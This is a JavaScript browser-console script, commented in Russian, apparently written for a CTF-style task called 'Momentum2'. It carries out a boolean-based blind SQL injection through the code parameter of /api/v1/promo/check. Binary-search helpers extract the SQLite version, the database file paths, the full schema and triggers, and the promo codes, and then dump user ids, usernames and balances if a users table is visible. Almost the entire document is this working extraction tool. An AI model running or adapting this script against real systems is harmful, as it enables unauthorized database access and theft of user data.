/* Momentum2 — что ещё видно через SQLi в /api/v1/promo/check
 *
 * Вставить в консоль на странице задачи, дождаться вывода.
 * Только чтение: INSERT/UPDATE здесь недоступны, endpoint делает SELECT.
 */
(async () => {
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const q = async sql => {
    for (let i = 0; i < 3; i++) {
      try {
        const r = await fetch('/api/v1/promo/check?code=' + encodeURIComponent("' OR (" + sql + ")-- "),
                              { credentials: 'include' });
        if (r.status === 200) {
          const j = await r.json();
          return j.available === true;
        }
      } catch (e) { /* сеть */ }
      await sleep(150);
    }
    return null;
  };

  // символ по алфавиту: ~6 вопросов вместо 7 по всему диапазону
  const CH = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_@|:-./ ";
  const chr1 = async (sel, i) => {
    const idx = `instr('${CH}',substr(ifnull((${sel}),''),${i},1))`;
    if (!(await q(`${idx}>=1`))) return null;          // вне алфавита — пропускаем символ
    let lo = 1, hi = CH.length;
    while (lo < hi) {
      const mid = (lo + hi + 1) >> 1;
      if (await q(`${idx}>=${mid}`)) lo = mid; else hi = mid - 1;
    }
    return CH[lo - 1];
  };
  const len = async (sel, hi = 4000) => {
    const e = `length(ifnull((${sel}),''))`;
    let lo = 0;
    while (lo < hi) {
      const mid = (lo + hi + 1) >> 1;
      if (await q(`${e}>=${mid}`)) lo = mid; else hi = mid - 1;
    }
    return lo;
  };
  const dump = async (sel, max = 4000) => {
    const n = Math.min(await len(sel, max), max);
    let out = '';
    for (let i = 1; i <= n; i++) {
      const c = await chr1(sel, i);
      out += c === null ? '?' : c;
    }
    return out;
  };
  const num = async (sel, hi = 1000000) => {
    let lo = 0;
    while (lo < hi) {
      const mid = (lo + hi + 1) >> 1;
      if (await q(`ifnull((${sel}),-1)>=${mid}`)) lo = mid; else hi = mid - 1;
    }
    return lo;
  };

  const log = (k, v) => console.log('%c' + k.padEnd(14) + '%c' + v,
    'color:#0a0;font-weight:bold', 'color:inherit');

  log('версия', await dump("SELECT sqlite_version()", 24));
  log('базы', await dump("SELECT group_concat(name||':'||file,' | ') FROM pragma_database_list", 600));
  log('объекты', await dump("SELECT group_concat(type||' '||name,' | ') FROM sqlite_master", 900));
  log('DDL', await dump("SELECT group_concat(sql,' ;; ') FROM sqlite_master", 3000));
  log('триггеры', await dump("SELECT group_concat(sql,' ;; ') FROM sqlite_master WHERE type='trigger'", 1200));
  log('promos строк', await num("SELECT count(*) FROM promos"));
  log('promos', await dump("SELECT group_concat(code||'@'||uses_left,'|') FROM promos", 600));

  // есть ли вообще users в этой базе — одной строкой
  log('есть users', await q("SELECT count(*) FROM sqlite_master WHERE name LIKE '%user%'"));
  log('имена users', await dump("SELECT group_concat(name,'|') FROM sqlite_master WHERE name LIKE '%user%'", 200));

  console.log('%c--- проверка, видна ли таблица users из этой базы ---',
              'color:#e90;font-weight:bold');
  const hasUsers = await q("SELECT count(*) FROM sqlite_master WHERE name='users'");
  if (hasUsers) {
    log('users cols', await dump("SELECT group_concat(name,',') FROM pragma_table_info('users')", 300));
    log('users rows', await num("SELECT count(*) FROM users"));
    log('users dump', await dump("SELECT group_concat(id||':'||username||':'||ifnull(balance,'?'),'|') FROM users", 2000));
  } else {
    console.log('таблицы users в этой базе нет — аккаунты лежат в другом файле SQLite');
  }
})();
